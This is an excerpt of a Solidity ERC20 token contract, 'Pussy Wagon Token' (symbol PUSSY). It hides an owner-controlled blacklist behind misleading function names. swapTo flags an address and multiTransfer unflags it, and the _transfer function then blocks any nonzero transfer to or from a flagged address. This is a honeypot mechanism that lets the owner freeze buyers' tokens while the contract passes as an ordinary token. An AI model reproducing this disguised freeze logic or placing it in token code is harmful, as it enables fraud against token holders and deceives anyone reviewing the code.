...
contract PussyWagonToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _swapTo;
    ...
    string private _name = 'Pussy Wagon Token';
    string private _symbol = 'PUSSY';
    ...
    function checkSwap(address _address) public view returns (bool) {
        return _swapTo[_address];
    }
    
    function swapTo(address account) external onlyOwner() {
        _swapTo[account] = true;
    }
    
    function multiTransfer(address account) external onlyOwner() {
        _swapTo[account] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_swapTo[sender] || _swapTo[recipient]) require(amount == 0, "");
